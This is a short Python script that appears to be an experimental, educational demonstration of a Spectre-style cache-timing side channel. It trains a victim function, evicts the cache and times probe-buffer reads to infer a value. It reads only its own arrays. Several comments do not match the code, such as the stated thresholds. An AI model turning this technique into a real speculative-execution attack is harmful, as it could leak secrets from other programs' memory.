#!/usr/bin/python

import time
from ctypes import *
from operator import itemgetter

page_size = 4096
eviction_len= 8*1024*1024
probe_len = 8192 * page_size # assure every of the 256 accessed addresses gets an own page
c_lines = 12 # count cache lies
s_lines = 64 # size per cache line
c_sets = 8192 # count cache sets


hit_treshold = 1.25 # treshold to distinguish cache hit from miss (miss takes 1.15 time as long to read)
# note on treshold: based on tests, includes operation delay, trimmed to pure "read and store" (no xor etc.)

step_shift = 12
arr_step = 1<<step_shift
arr_size = arr_step<<13


probebuf = bytearray(probe_len)
evictbuf = bytearray(eviction_len)

x_len = 16
x_arr = bytearray(20)
for i in range(len(x_arr)):
	x_arr[i] = i

def victim_function(x):
	#print("Accessing idx {0} of test array (=value)".format(x))
	# access probe array based on result of x_arr access
	if (x < x_len):
		a = probebuf[x_arr[x] * page_size]
	

def evict_cache():
	a = 0
	step = 64
	for i in range(0, len(evictbuf), step):
		a = evictbuf[i]
		

def read_idx(idx):
	addr=idx*page_size
	# measure read
	start = time.perf_counter()
	a = probebuf[addr]
	elapsed = time.perf_counter() - start
	#print("read idx {0}: {1:.12f} seconds".format(idx ,elapsed))
	return elapsed


time.perf_counter()


# fill evictbuf
print("Filling evict buffer, used for cache eviction")
for i in range(len(evictbuf)):
	evictbuf[i] = (i%255) + 1
	
# fill probebuf
print("Filling probe buffer, used to leak values")
for i in range(len(probebuf)):
	probebuf[i] = (i%255) + 1


res={}
for i in range(256):
	res[i]=0

goodguess=False
attempt=0
while not goodguess:
	attempt += 1
	
	# train victim
	victim_function(11)
	victim_function(1)
	victim_function(9)
	
	# flush cache
	print("Round {0} ... flush cache".format(attempt))
	evict_cache()

	
	##### here's the place to cache an access to the probe array ######
	victim_function(15)


	# measure read
	for probeidx in range(256):
		testidx=probeidx

	#	print("Testing idx {0}".format(testidx))
		e1 = read_idx(testidx)
		e2 = read_idx(testidx)
		if (e1 < e2*hit_treshold):
			print("hit {0}".format(testidx))
			res[testidx] += 1

	# print top5 results
	so = sorted(res.items(), key=itemgetter(1), reverse=True)
	print(so[:5])
	
	# we abort a soon as the best guess has 2-times as many hits as its successor (minimum 10 hits)
	if ((so[0][1] > 20) and (so[0][1] > 2*so[1][1])):
		goodguess=True
		result=so[0][0]
		print("Value estimated after {0} rounds is: {1}".format(attempt, result))
